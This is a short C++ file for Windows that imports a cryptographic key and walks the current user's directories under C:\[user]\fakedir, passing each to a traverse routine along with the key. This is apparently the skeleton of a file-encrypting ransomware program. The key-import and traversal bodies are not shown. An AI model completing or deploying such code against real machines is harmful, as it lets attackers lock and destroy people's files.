#include <iostream>
#include <Windows.h>
#include "strsafe.h"





//Function declarations

bool traverse(LPCWSTR targetDir, HCRYPTKEY clé,int nLevel = 0);
HCRYPTKEY keyimport();


//Main

int main() {

	//TODO ; use the getusername func and a bit of string manipulation for the dirs absolute path C:\\[name]\\fakedir\\

	LPCWSTR targetDirs[] = { L"\\fakedir" };
	WCHAR name[60];
	DWORD size = sizeof(name) / sizeof(name[0]);
	GetUserName(name, &size);
	

	HCRYPTKEY key = keyimport();

	for (LPCWSTR singledir : targetDirs) {
		
		WCHAR absoluteDirPath[MAX_PATH] = L"C:\\";
		StringCchCatW(absoluteDirPath, MAX_PATH, name);
		StringCchCatW(absoluteDirPath, MAX_PATH, singledir);
		traverse(absoluteDirPath,key);
	}

	return 0;
}